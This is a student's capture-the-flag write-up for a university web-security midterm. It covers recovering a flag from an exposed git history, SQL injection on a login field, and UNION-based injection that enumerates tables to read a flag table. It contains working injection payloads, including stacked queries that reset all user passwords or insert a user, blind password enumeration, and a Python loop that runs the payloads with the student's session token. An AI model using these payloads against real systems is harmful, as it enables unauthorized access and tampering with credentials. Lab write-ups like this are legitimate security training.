# Midsem

## 1
Hidden git folder

git log returns
`
adf538f485e62c9dd82a5525a7912adbb4532e14 24ba0240b361ae579e5b93acb7d395a94c1cbbe7 sean <s@mewy.pw> 1551850397 +1100	revert: Revert "Added flag"
`

By the dumping the repo we can explore previous commits and retrieve the flag.
```
git log
git checkout 24ba0240b361ae579e5b93acb7d395a94c1cbbe7
cat app.py
```

`COMP6443{8fda877f-38c4-4b1f-96b5-2d35f64220ba}`


## 2
The username is vulnerable to sql injection

`SELECT username, password\n FROM users\n WHERE username=‘’ ‘\n LIMIT 1`

‘ AND

‘ AND 1=0 UNION Select username, ‘password’ from users where username like ‘%%’ and ‘1’=‘1

Password hash256 does not match

We can update  all the users passwords and then login
```
' or 1='1'; update users set password=HASHBYTES('SHA2_256','password'); Select username, password from users where 1='1
```

Since it is postgresql:
```
' or 1='1'; update users set password=digest('password', 'SHA2_256'); Select username, password from users where 1='1
```

digest is unavailable…

We can also enumerate the user’s password by doing something like
```
’ and 1=1 and password like 'c%
```

and modifying the char until we get a hit.


Trying to insert already sha256 password
```
' or 1='1'; INSERT INTO users (username, password)
VALUES ('test','f2ca1bb6c7e907d06dafe4687e579fce76b37e4e93b7605022da52e6ccc26fd2'); Select username, password from users where 1='1

```

## 3
Parameter page is vulnerable to sql injection

' and 1=0 UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES as p where p.table_schema != 'information_schema' and p.table_schema != 'pg_catalog

Returns `Failed to complete request: Unable to find route: page`

Page is therefore the name of one of the tables

We can enumerate all tables with

```
' and 1=0 UNION (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES as p where p.table_schema != 'information_schema' and p.table_schema != 'pg_catalog' LIMIT 1 OFFSET 2) --
```

and simply increment the offset.

Tables are:
- page
- person
- flag


```
' and 1=0 UNION (SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.columns where table_name='flag' LIMIT 1 OFFSET 0) --
```

Flag table columns:
- id
- flag

```
' and 1=0 UNION (SELECT flag FROM flag limit 1 offset 10) --
```

A simple program to get all the offsets:
```
import requests

c = {
        'zid' : 'z5016776',
        'token' : '15b68583d63975c4d1656800cef7714b92358466802a603535298ebd5850dea1'
        }

for i in range(0,100):
    input = "' and 1=0 UNION (SELECT flag FROM flag limit 1 offset {}) -- ".format(i)
    r = requests.get("http://q3.69528ba63fc22addc0ca72e6b701c02d.midsem.ns.agency/?page=" + input, cookies=c)
    print r.text
```

Simply run and grep for the flag:
`COMP6843{e65e9af7-704a-4acd-944c-d67cb8dc3442}`
